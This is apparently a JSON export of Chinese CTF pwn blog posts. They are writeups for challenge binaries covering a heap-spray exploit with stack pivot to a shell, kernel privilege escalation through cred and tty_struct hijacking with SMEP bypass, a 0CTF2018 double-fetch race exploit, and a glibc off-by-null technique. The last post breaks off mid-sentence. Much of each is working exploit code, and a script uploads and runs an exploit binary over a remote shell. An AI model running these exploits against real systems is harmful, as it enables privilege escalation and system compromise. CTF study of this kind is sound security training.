(2)getshell原理\n\n有了地址之后就可调用libc上任意的函数了，这里的one_gadget都用不了，在没办法往栈上输入数据的情况下就需要栈劫持了，这里找两个gadget，原题给的是：\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword ptr[eax]\nmagic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\n我用我自己编译的Libc是：\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00164401# 0x00161871 : xchg eax, ecx ; cli ; jmp dword ptr[eax]\nmagic_gadget2 = 0x00073c10+0x3a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\n一样的，没啥区别，得自己找去。ROPgadget。\n\n在调用`jmp *(*(chunk_addr+size))+0x4`时，看到context为\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-38-18.png)\n\n这里的ecx就保存这一个堆地址，那么我们就利用ecx和eax结合这两个gdaget来进行栈劫持，从而getshell。\n\n## 3.exp编写：\n\n### (1)堆喷堆布局\n\n填充数据在堆上，满足`*magic_addr=magic_addr`，且其他chunk的所有数据也为magic_addr\n\n```python\n#注释头\n\n#----------------------------------------\n#fill 0x58 to all chunk\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x20000 - 1), 1])\nmalloc(0x20000, data)\ndelete()\n\nfor i in range(0x10):\n    malloc(0x20000, data)\n\n#idx 0x0->0x100-1\n#----------------------------------------\n```\n\n### (2)填充需要触发的chunk数据\n\n满足`*chunk_addr + size = magic_addr`，然后调用callfuc函数使得`*magic_addr= magic_addr-1`，打印数据之后即可判断。\n\n```python\n#-----------------------------------------------\n#fill 0x1000 all 0x58 (idx 0x100->0x110-1)\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x1000 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\n\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0xf0 - 1), 0])\nmalloc(0xf0, data)\n#idx 0x100->0x110-1\n\n\n#0x100->0x110-1 OK\ncallfuc(0x100)\nshow(0, 0x100)\n#-----------------------------------------------\n```\n\n### (3)判断chunk基于的BigChunk索引：\n\n```python\n#注释头\n\nindex = 0\noffest = 0\nout = ''\nmagic_addr = 0x58585858\nfor i in range(0x100):\n    out = p.recvline()\n    if 'W' in out:\n        index = i\n        break\nout = out[12 : ]\noffest = out.index('W')\n\nlog.info('magic_addr is : %d' % index)\nlog.info('offest is : %d' % offest)\nlog.info('start addr is : ' + hex(magic_addr- offest))\nblock_start = (index / 0x10) * 0x10\n```\n\n### (4)计算chunk在BigChunk中的位置：\n\n```python\n#注释头\n\ndelete()\ncount = 1\np_index = 0\nwhile 1:\n    log.info(\"start find prev block count = %d\" % count)\n    data = []\n    for i in range(0x10):\n        data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),\n1])\n    malloc(0x1000, data)\n    delete()\n\n    data = []\n    for i in range(0x10):\n        data.append(['X' * (0xa0 - 1), 0])\n    malloc(0xa0, data)\n\n    log.info(\"start call fuc count = %d\" % count)\n    callfuc(0x100)\n    show(block_start - 0x10, index + 1)\n    p_index = 0\n    out = ''\n    for i in range(index + 1 - block_start + 0x10):\n        out = p.recvline()\n        if 'W' in out:\n            p_index = i + block_start - 0x10\n            break\n    delete()\n    if p_index < block_start:\n        break\n    count += 1\n\n\nlog.info('block start is : %d' % block_start)\nlog.info('p_index is : %d' % p_index)\nheap_start_addr = magic_addr - 0x20008 * (count - 1 + 0x10 * (block_start / 0x10)) - offest - 8\nlog.info('heap start is : ' + hex(heap_start_addr))\n```\n\n同样的方法，依据地址顺序遍历BigChunk中的0x1-0x10的所有可能范围，对于修改*chunk_addr= magic_addr-1，然后打印判断得到各个索引对应的地址。由于创建的时候是random函数，所以也可以用爆破的方式解决，概率为1/16。\n\n### (5)获取libc地址\n\n方法是释放之后使之进入unsortedbin踩下地址，利用callfuc函数和字节错位的方法对抗\\x00截断从而泄露出地址：\n\n```python\n#注释头\n\nfor i in range(0x10):\n    delete()\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append(['aaa', 0])\nmalloc(0xa0, data)\ncallfuc(0)\nshow(0, 0x10)\nfor i in range(index + 1 - block_start + 0x10):\n    out = p.recvline()\n    out = out[12 : -1]\n    if 'aaa' != out:\n        libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0\n        break\nlog.info('libc addr is : ' + hex(libc_addr))\ndelete()\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\n这里的main_arena变化是因为0xedb7ab000变为了0xedb7afff，导致字节错位变化的，具体调试一下就知道\n\n### (6)劫持栈\n\n结合gadget来getshell。\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00164401       \n#xchg eax, ecx ; cli ; jmp dword ptr[eax] \nmagic_gadget2 = 0x00073c10+0x3a  \n#xchg eax, esp ; sal bh, 0xd8 ;\nsystem_offest = 0x3adb0\nbinsh_addr = 0x15bb0b\n# gdb.attach(p)\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr\n+ magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +\np32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\\x00'), 0])\nmalloc(0xa0, data)\ncallfuc(0)\np.interactive()\n```\n\n这里关于最后堆上数据的布局需要调试才能知道，建议先随便写几个，然后调试的时候在写数据。\n\n▲题外话：这里其实并没有用到常规意义上的通过堆喷滑板0x0c，0x58之类的滑板指令来执行shellcode或者ROP，所以其实这里的magic_addr换成0x57575757，0x56565656也是一样可以的，只不过成功率可能会小不少，毕竟这里还最开始申请了一个随机大小的堆块，而且PIE堆的随机化程度也大多在0x56到0x58之间。\n\n## 4.总结：\n\n- 堆喷思想：其实就是多级指针的思想，通过劫持指针来滑动程序流或者泄露地址。\n\n- 调试：汇编指令一定要熟悉，像劫持栈常用的xchg eax,esp等。","tags":["Heap-spray"],"categories":["PWN","pwn堆-spray"]},{"title":"pwn-kernel_常见提权手段","url":"/2021/08/18/pwn-kernel_常见提权手段/","content":"\n一、利用cred结构体提权：\n\n1.前置知识：\n\n(1)kernel中会为每个进程创建一个cred结构体，保存了该进程的权限等信息如（uid，gid）等，如果能修改这个结构体那么就修改了这个进程的权限。\n\n(2)修改进程的权限为root之后，再通过该进程开的shell那么也就是root权限了，实现提权。\n\n2.利用手段：\n\n(1)通过UAF，将一块已经释放的堆块修改大小为cred结构体大小，然后创建进程，就会将该堆块申请为cred结构体。\n\n(2)再通过UAF将该cred结构体中的uid、gid改掉，实现进程提权。\n\n▲那么如何知道cred结构体的大小呢，不同linux内核版本的cred结构体大小不同：\n\n①通过linux内核版本，上源码查看网址，查找对应的cred结构体：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458125.jpeg)\n\n访问对应版本：https://elixir.bootlin.com/linux/v4.4.70/source/include/linux/cred.h\n\n可以看到某内核的cred结构体大小，这里是0xa8：\n\n```\n//注释头\n\nstruct cred {\n    atomic_t usage; 0x4\n    #ifdef CONFIG_DEBUG_CREDENTIALS debug选项去掉\n    atomic_t subscribers; /* number of processes subscribed */\n    void *put_addr;\n    unsigned magic;\n    #define CRED_MAGIC 0x43736564\n    #define CRED_MAGIC_DEAD 0x44656144\n    #endif\n    kuid_t uid; /* real UID of the task */ 0x4\n    kgid_t gid; /* real GID of the task */ 0x4\n    kuid_t suid; /* saved UID of the task */ 0x4\n    kgid_t sgid; /* saved GID of the task */ 0x4\n    kuid_t euid; /* effective UID of the task */ 0x4\n    kgid_t egid; /* effective GID of the task */ 0x4\n    kuid_t fsuid; /* UID for VFS ops */ 0x4\n    kgid_t fsgid; /* GID for VFS ops */ 0x4\n    unsigned securebits; /* SUID-less security management */ 0x4\n    kernel_cap_t cap_inheritable; /* caps our children can inherit */ 0x8\n    kernel_cap_t cap_permitted; /* caps we're permitted */ 0x8\n    kernel_cap_t cap_effective; /* caps we can actually use */ 0x8\n    kernel_cap_t cap_bset; /* capability bounding set */ 0x8\n    kernel_cap_t cap_ambient; /* Ambient capability set */ 0x8\n    #ifdef CONFIG_KEYS\n    unsigned char jit_keyring; /* default keyring to attach requested 0x8\n    * keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */ 0x8\n    struct key *process_keyring; /* keyring private to this process */ 0x8\n    struct key *thread_keyring; /* keyring private to this thread */ 0x8\n    struct key *request_key_auth; /* assumed request_key authority */ 0x8\n    #endif\n    #ifdef CONFIG_SECURITY\n    void *security; /* subjective LSM security */ 0x8\n    #endif\n    struct user_struct *user; /* real user ID subscription */ 0x8\n    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ 0x8\n    struct group_info *group_info; /* supplementary groups for euid/fsgid */ 0x8\n    struct rcu_head rcu; /* RCU deletion hook */ 0x10\n};\n```\n\n这里大小是去掉debug部分的成员的大小，因为题目给的bzImage内核文件一般都不包含debug选项，包含的话会特别大，这里后面标注的大小是某个大佬标注：\n\nhttps://www.jianshu.com/p/a465b3f6d7cb\n\n②直接自己写一个小module加载打印cred结构体大小：\n\n```\n//简单modules\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/cred.h>\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\nstruct cred c1;\nstatic int hello_init(void)\n{\n    printk(\"<1> Hello world!\\n\");\n    printk(\"size of cred : %d \\n\",sizeof(c1));\n    return 0;\n}\nstatic void hello_exit(void)\n{\n    printk(\"<1> Bye, cruel world\\n\");\n}\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nA.新建一个hello文件夹，放上述代码hello.c和Makefile，设置Makefile为：\n\n```\nobj-m := hello.o\n\nKERNELDR := /usr/src/linux-headers-4.15.0-22-generic\n\nPWD := $(shell pwd)\n\nmodules:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules\n\nmoduels_install:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install\n\nclean:\nrm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions\n```\n\n这里的KERNELDR目录是编译之后的kernel目录\n\nmake命令编译下这个hello.c，会生成几个文件，只需要hello.ko\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458099.jpeg)\n\nB.在根文件系统中vim init，设置一下，加上insmod /hello.ko，再重新打包，通过qemu启动内核，启动命令为：\n\n```\n#注释头\n\nqemu-system-x86_64 \\\n-m 128M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr\" \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\n这里不能在append中添加quiet命令，否则没法打印出来\n\nC.之后就可以看到\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458400.jpeg)\n\n参照：[https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/](https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-初探-1/)\n\n(3)一般而言，修改cred结构体可以直接从头开始，将头部至gid的部分都赋值为0即可，因为前面的数据基本用不到，不需要再去找原始数据来赋值。\n\n二、利用ptmx设备中的tty_struct结构体\n\n1.前置知识：\n\n(1)打开设备，open(\"/dev/ptmx\", O_RDWR)时会创建一个tty_struct\n\n(2)tty_struct结构体中有一个const struct tty_operations *ops;结构体指针，偏移为xx。\n\n```\n//注释头\n\nstruct tty_struct {\n    int magic;\n    struct kref kref;\n    struct device *dev;\n    struct tty_driver *driver;\n    const struct tty_operations *ops;\n    int index;\n\n    /* Protects ldisc changes: Lock tty not pty */\n    struct ld_semaphore ldisc_sem;\n    struct tty_ldisc *ldisc;\n\n    struct mutex atomic_write_lock;\n    struct mutex legacy_mutex;\n    struct mutex throttle_mutex;\n    struct rw_semaphore termios_rwsem;\n    struct mutex winsize_mutex;\n    spinlock_t ctrl_lock;\n    spinlock_t flow_lock;\n    /* Termios values are protected by the termios rwsem */\n    struct ktermios termios, termios_locked;\n    struct termiox *termiox; /* May be NULL for unsupported */\n    char name[64];\n    struct pid *pgrp; /* Protected by ctrl lock */\n    struct pid *session;\n    unsigned long flags;\n    int count;\n    struct winsize winsize; /* winsize_mutex */\n    unsigned long stopped:1, /* flow_lock */\n        flow_stopped:1,\n        unused:BITS_PER_LONG - 2;\n    int hw_stopped;\n    unsigned long ctrl_status:8, /* ctrl_lock */\n        packet:1,\n        unused_ctrl:BITS_PER_LONG - 9;\n    unsigned int receive_room; /* Bytes free for queue */\n    int flow_change;\n\n    struct tty_struct *link;\n    struct fasync_struct *fasync;\n    int alt_speed; /* For magic substitution of 38400 bps */\n    wait_queue_head_t write_wait;\n    wait_queue_head_t read_wait;\n    struct work_struct hangup_work;\n    void *disc_data;\n    void *driver_data;\n    struct list_head tty_files;\n\n#define N_TTY_BUF_SIZE 4096\n\n    int closing;\n    unsigned char *write_buf;\n    int write_cnt;\n    /* If the tty has a pending do_SAK, queue it here - akpm */\n    struct work_struct SAK_work;\n    struct tty_port *port;\n};\n```\n\n结构体大小为0x2e0，但是不知道各个版本的大小是不是都一样，如果需要查看大小，仍然可以用上述方法，去网站，或者编译一个小module\n\n网站：https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h\n\nmodule：参照上面的，打印即可。\n\n(3)tty_operations结构体中有一个int (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); 函数指针，这个函数在与ptmx设备进行交互，调用write函数时就会调用该函数。\n\n```\n//注释头\n\nstruct tty_operations {\n    struct tty_struct * (*lookup)(struct tty_driver *driver,\n    struct inode *inode, int idx);\n    int (*install)(struct tty_driver *driver, struct tty_struct *tty);\n    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n    int (*open)(struct tty_struct * tty, struct file * filp);\n    void (*close)(struct tty_struct * tty, struct file * filp);\n    void (*shutdown)(struct tty_struct *tty);\n    void (*cleanup)(struct tty_struct *tty);\n    int (*write)(struct tty_struct * tty,\n        const unsigned char *buf, int count);\n    int (*put_char)(struct tty_struct *tty, unsigned char ch);\n    void (*flush_chars)(struct tty_struct *tty);\n    int (*write_room)(struct tty_struct *tty);\n    int (*chars_in_buffer)(struct tty_struct *tty);\n    int (*ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    long (*compat_ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);\n    void (*throttle)(struct tty_struct * tty);\n    void (*unthrottle)(struct tty_struct * tty);\n    void (*stop)(struct tty_struct *tty);\n    void (*start)(struct tty_struct *tty);\n    void (*hangup)(struct tty_struct *tty);\n    int (*break_ctl)(struct tty_struct *tty, int state);\n    void (*flush_buffer)(struct tty_struct *tty);\n    void (*set_ldisc)(struct tty_struct *tty);\n    void (*wait_until_sent)(struct tty_struct *tty, int timeout);\n    void (*send_xchar)(struct tty_struct *tty, char ch);\n    int (*tiocmget)(struct tty_struct *tty);\n    int (*tiocmset)(struct tty_struct *tty,\n        unsigned int set, unsigned int clear);\n    int (*resize)(struct tty_struct *tty, struct winsize *ws);\n    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);\n    int (*get_icount)(struct tty_struct *tty,\n    struct serial_icounter_struct *icount);\n#ifdef CONFIG_CONSOLE_POLL\n    int (*poll_init)(struct tty_driver *driver, int line, char *options);\n    int (*poll_get_char)(struct tty_driver *driver, int line);\n    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);\n#endif\n    const struct file_operations *proc_fops;\n};\n```\n\n这个结构体在伪造的时候就可以随便伪造了，只要函数偏移位置对就行。\n\n(4)所以我们伪造一个tty_struct结构体fake_tty_1，利用UAF漏洞将一个堆块申请为这个结构体，修改其const struct tty_operations *ops;结构体指针指向另一个伪造的tty_operations结构体fake_tty_2。\n\n(5)将tty_operations结构体fake_tty_2中的int (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); 函数指针指向ROP链，调用ROP，控制程序。\n\n(6)控制程序之后一般需要关闭掉smep保护，之后用ret2Usr来提权。\n\n▲关闭smep保护：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458313.jpeg)\n\n需要将CR4寄存器中的第20位置0，即可关闭。一般在ROP链中执行下列gadget即可：\n\n```\n#注释头\n\nmov cr4,0x6f0; ret;\n----------------------------------------------------------------------\npop rdi; ret\n0x6f0\nmov cr4,rdi; ret;\n```\n\n上面两种都行，或者其它满足条件的gadget也可以，这里0x6f0是想绕过一些机制。\n\n2.利用手段：\n\n(1)通过UAF申请得到tty_struct结构体指针，修改const struct tty_operations *ops使其指向用户空间伪造的tty_operations结构体，伪造的tty_operations结构体中的write指针指向ROP链。\n\n(2)ROP链进行迁移内核栈，关闭smep保护，正常ret2Usr。\n\n ","tags":["kernel-skill"],"categories":["pwn-kernel"]},{"title":"0CTF2018-baby(double-fetch)","url":"/2021/08/14/0CTF2018-baby(double-fetch)/","content":"\n只给了baby.ko和加载的文件系统core.cpio，没有内核和启动脚本，所以需要下载和配置。\n\n1.下载内核配置环境：\n\n(1)IDA打开baby.ko查看十六进制的汇编可以看到调用的Linux版本，可以下载源码编译或者直接下载编译好的。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-27_12-07-25.png)\n\n(2)解压得到压缩内核：\n\n```bash\n#注释头\n\napt search linux-image-[version]\napt download xxxx\nar -x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb\n```\n\n在./data/boot中有vmlinuz-4.15.0-22-generic，不要再类似压缩为bzImage，可以直接用来启动qemu。\n\n(3)配置文件系统和启动脚本：\n\n①文件系统：用busybox制作的，find ./* | cpio -H newc -o > rootfs.cpio\n\n![1](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\n②启动脚本和配置文件：\n\n![2](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n```bash\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 256M -smp 4,cores=2,threads=2 \\\n-kernel ./vmlinux \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokalsr\" \\\n-cpu qemu64 \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n#-gdb tcp::1234 \\\n# -S\n```\n\n \n\n2.开始解析baby.ko\n\n(1)两个实际命令，在baby_ioctl函数中：\n\n![3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\n①0x6666命令可以得到flag在内核空间的地址\n\n②0x1337命令会触发三个检查，如果检查成功则可以打印出flag\n\n(2)漏洞点：\n\n漏洞在检查上，三个检查是检查通过ioctl传入的数据rdx。\n\n▲_chk_range_not_ok函数：将第一个参数rdi和第二个参数rsi相加，判断是否小于第三个参数rdx，如果大于等于将al置为1(al即rax的低8位寄存器)，如果小于则返回0，而如果要进入该if，则需要返回值为0，则需rdi+rsi < rdx。\n\n①检查一：_chk_range_not_ok(v2, 16LL, *(__readgsqword(&current_task) + 4952)其中的*(__readgsqword(&current_task) + 4952)其实是用户空间的起始地址：\n\n![4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.png)\n\n即传入数据的地址加上16需要小于0x7ffffffff000，而小于0x7ffffffff000则表示处在用户空间中：\n\n![5](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\n那么就是检查传入的数据的地址是否位于用户空间。\n\n②检查二即将传入的数据作为一个结构体，检查该结构体中flag指针对应的数据的地址加上flag的长度是否位于用户空间。\n\n③检查三即检查flag的长度是否和程序中硬编码的长度相等。\n\n▲由于传入的结构体是由我们控制的，且过程中依据该结构体来索引flag，其中的flag指针我们也可以改变，所以如果在检查结束之后，打印flag之前，能够将flag指针指向内核空间真正的flag处，那么就能够通过：\n\n```c\n#注释头\n\nfor ( i = 0; i < strlen(flag); ++i )\n{\n    if ( *(*v5 + i) != flag[i] )\n    return 22LL;\n}\n```\n\n从而打印内核空间真正的flag了。而这个内核空间flag的地址可以通过命令0x6666得到，这样就类似于利用了一个条件竞争的漏洞。\n\n \n\n3.编写exp\n\n(1)首先是结构体：\n\n```\n#注释头\n\nstruct MyflagStruc\n{\n    char *flag;\n    size_t len;\n};\n```\n\n(2)接着打开dev获取地址:\n\n```\n#注释头\n\nint fd = open(\"/dev/baby\",O_RDONLY);\nioctl(fd,0x6666);\n\nsystem(\"dmesg > /tmp/record.txt\");\nallInfo_fd= open(\"/tmp/record.txt\",O_RDONLY);\nlseek(allInfo_fd,-0x1000,SEEK_END);\nread(allInfo_fd,buf,0x1000);\nclose(allInfo_fd);\nidx = strstr(buf,\"Your flag is at \");\nif (idx == 0){\n    printf(\"[-]Not found addr\");\n    exit(-1);\n}\nelse{\n    idx += 16;\n    kernelFlag_addr = strtoull(idx,idx+16,16);\n    printf(\"[+]kernelFlag_addr: %p\\n\",kernelFlag_addr);\n}\n```\n\n①关于dmesg，这个命令是获取从启动虚拟机开始的几乎所有的输出信息，所以如果我们打开baby这个dev，就能够得到里面printk函数的相关输出，然后把输出重定向到/tmp/record.txt这里面，再从record.txt中获取地址。同时由于是所有的输出信息，所以返回给我们的flag地址肯定是在最后面的，所以lseek(allInfo_fd,-0x1000,SEEK_END);从最后面往前获取0x1000个字节，然后再来用strstr获取子字符串索引，最后strtoull转换地址得到内核中flag的地址。\n\n![6](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.png)\n\n(3)然后创建线程，爆破修改数据中flag指向的地址。\n\n```\n#注释头\n\nMyflagStruc myflag;\nmyflag.len = 33;\nmyflag.flag = buf;\npthread_create(&myflag, NULL, change_attr_value,&myflag);\nfor(int i = 0; i < 0x1000; i ++){\n    ret = ioctl(fd, 0x1337, &myflag);\n    myflag.flag = buf;\n}\nfinish = 1;\npthread_join(myflag, NULL);\nclose(fd);\nputs(\"[+]result is :\");\nsystem(\"dmesg | grep flag\");\n```\n\n线程方面这涉及回调函数相关知识，自己补吧。\n\n(4)线程回调函数：修改flag指向内核的flag，从而能够通过逐字节验证\n\n```\n#注释头\n\nvoid changeFlagAddr(void *myflag){\n    while(finish==0){\n        myflag->flag = kernelFlag_addr ;\n    }\n}\n```\n\n \n\n4.一些注意事项：\n\n(1)头文件的注意事项，和写小程序一样，自己加。\n\n(2)线程注意事项：gcc编译时需要加上-lpthread参数，并且要静态编译。\n\n(3)输入输出重定向：我看很多exp都有关闭输入输出流的，但是我尝试了一下，不用关其实也可以，可能是对应的环境关系吧。\n\n```\n#注释头\n\nsetvbuf(stdin,0,2,0);\nsetvbuf(stdout,0,2,0);\nsetvbuf(stderr,0,2,0);\n```\n\n(4)文件传输模块：\n\n先转发一下启动程序：\n\n```\n#注释头\n\nsocat tcp-listen:30000,fork exec:./boot.sh,reuseaddr\n```\n\n可以用下列脚本，这个脚本参照这位师傅的：\n\nhttps://blog.csdn.net/seaaseesa/article/details/104537991\n\n```\n#注释头\n\n# coding:utf8\nfrom pwn import *\nimport base64\n \nsh = remote('127.0.0.1',30000)\n \n#exploit\nf = open('./exp','rb')\ncontent = f.read()\ntotal = len(content)\nf.close()\n\n# segment send\nper_length = 0x200;\n# touch file\nsh.sendlineafter('$ ','touch /tmp/exploit')\n\nlog.info(\"Total length:%d\"%total)\nfor i in range(0,total,per_length):\n   bstr = base64.b64encode(content[i:i+per_length])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n   print(i)\n   \nif total - i > 0:\n   bstr = base64.b64encode(content[total-i:total])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n \nsh.sendlineafter('$ ','chmod +x /tmp/exploit')\nsh.sendlineafter('$ ','/tmp/exploit')\nsh.interactive()\n```\n\n(5)调试模块：\n\n关于文件系统的选择方面，用精简版的Busybox开出来的qemu调试的时候获取加载模块的基地址总是出错，暂时不知道为什么后面补。\n\n但是可以用2018强网杯core的文件系统，加载之后调试的基地址没问题，这个在ctfwiki上有。\n\n \n\n","tags":["kernel题"],"categories":["pwn-kernel","Kernel_doubleFetch"]},{"title":"2.29-2.32下的off-by-null","url":"/2021/08/14/2.29-2.32下的off-by-null/","content":"\n最近发现一种对于高版本libc更好的方法，不用爆破，先贴下连接：\n\nhttps://www.anquanke.com/post/id/236078#h3-7\n\n而且这个可以说是通杀除了2.33版本的所有Libc，因为没用用到tcache和fastbin，这位大佬WJH师傅真是神仙。但是他的有些地方有点出入，刚开始调试的时候容易直接干蒙，所以这里总结一下。\n\n▲总的来说是运用unsortedbin来踩地址，然后再借用unsortedbin和Largebin加上off-by-null来修复fd，bk，从而能够通过新增的检查。这里我拿\n\n第三届山东新一代信息技术创新应用大赛 werewolf2，原题是2.27的，这里用2.31模拟一下。\n\n这道题来举例，题目不同chunk的索引对应变化。\n\n1.首先堆风水布局，让我们之后申请用来利用的chunk的后一个字节可控，就是得为0x00，方便off-by-null利用。\n\n```python\n#注释头\n\nadd(0x1000-0x8-0xf0,'padd')#0\n```\n\n这个堆布局看具体的环境，有的题上来先申请一堆堆块，容易搞蒙，d调一下就知道了。\n\n2.然后准备堆块，结合之前的堆布局，需要满足条件：\n\n```python\n#注释头\n\nadd(0x418,'\\x01'*0x410) #1 fd  0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk  0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk  0x---150\nadd(0x208,'\\x07'*0x200) #7\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-18-35.png)\n\n其中0x108大小的堆块主要是辅助加隔离，然后0x428之类的几个不同大小是为切割unsortedbin来搞事。然后这里我申请了0x208大小的堆块，这个堆块的作用主要就是隔离和填充，然后原贴的大佬由于size位用到了\\x0a，是个换行符，Pwn中一般比骄敏感，容易无法发送，所以这里我多申请0x100，让之后的size位变成\\x0b，方便利用。\n\n3.然后就开始搞事，首先释放这几个chunk。\n\n```python\n#注释头\n\nfree(1)\nfree(4)\nfree(6)\nfree(3)\n```\n\n满足如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-33-40.png)\n\n释放顺序需要注意，要利用unsortedbin在0x---c00这个chunk上留下0x---2b0和0x---150的地址作为fd和bk，之后再修复fd->bk和bk->fd：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-48-19.png)\n\n其中两个chunk合并了组成了0x---7e0这个chunk，方便切割之后修改0x---c00的size位。\n\n4.之后申请chunk，从0x---7e0中申请切割，修改0x---c00的size位，同时会触发malloc_consolidate将0x---150和0x--2b0放入largebin中，这个没啥用，直接申请回来就可以了，主要是切割。\n\n```python\n#注释头\n\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\nadd(0x418,'\\x09'*0x410) # 9     0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-42-30.png)\n\n5.之后就开始修复fd和bk，利用0x---c20和对应的fd,bk，进入unsortedbin来修复。\n\n(1)修复fd:\n\n先释放0x---2b0，然后释放0x---c20，利用unsortedbin来给0x---2b0的bk踩上0x---c20的地址，然后申请回来，方便之后修复bk(0x---150)，同时将踩下的地址从0x---c20修改为0x---c00，即可修复成功。\n\n```python\n#注释头\n\nfree(11)  #0x---2b0\nfree(9)   #0x---c20\nadd(0x418, 'PIG007nb')  # 12 0x---c20 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-06-10.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-03-45.png)\n\n(2)修复bk：首先进入Unsortedbin中踩地址\n\n```python\n#注释头\n\nfree(13)\nfree(10)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-43-09.png)\n\n没啥问题 ，但是申请回来的时候有点大问题：\n\n①如果先申请0x---c20，那么就会使得unsortedbin中顺序变为：\n\n0x---150 -> main_arena+96，导致原先的0x---150.fd被修改，无法完成修复。\n\n②如果先申请0x---150，那么由于unsortedbin机制，依据fd遍历，就会先遍历到0x---c20，导致0x---c20解链放入largebin中，unsortedbin中的情况和先申请0x---c20是一样的，先变成0x---150 -> 